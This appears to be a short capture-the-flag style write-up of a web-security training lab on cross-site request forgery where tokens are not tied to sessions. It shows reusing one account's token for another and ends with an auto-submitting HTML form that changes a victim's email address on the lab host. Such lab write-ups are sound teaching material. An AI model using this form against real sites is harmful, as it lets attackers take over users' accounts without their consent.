<img width="1058" height="447" alt="image" src="https://github.com/user-attachments/assets/461b7061-89ba-43ad-81d6-3d82a4c64247" />Title: CSRF where token is not tied to user session
Level: PRACTITIONER
Desc:  This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.
To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.
You have two accounts on the application that you can use to help design your attack. The credentials are as follows:
    wiener:peter
    carlos:montoya

# Walkthrough: 
I can't make request without csrf token: 
<img width="1058" height="447" alt="image" src="https://github.com/user-attachments/assets/f1e9e586-3862-460d-8ae0-3a70eb9f056d" />

But, now I have token for wiener user: `csrf=e6Kha15MBzK6x5fSzcUomjhD7LgbypYK`
Maybe it is possible to use the same token for user carlos


<img width="1041" height="480" alt="image" src="https://github.com/user-attachments/assets/8e3e5790-51ee-4841-8a42-1b1f8ccd99bd" />
It works.

Now, the same paylaod as always, but with token from wiener: 
```
<form method="POST" action="https://0a4300fd04417416815743bd00c200b8.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="test31@normal-user.net">
    <input type="hidden" name="csrf" value="16puCALzTg3sTTSWUHdeqevDG7J0HRkt">
</form>
<script>
    document.forms[0].submit();
</script>
```
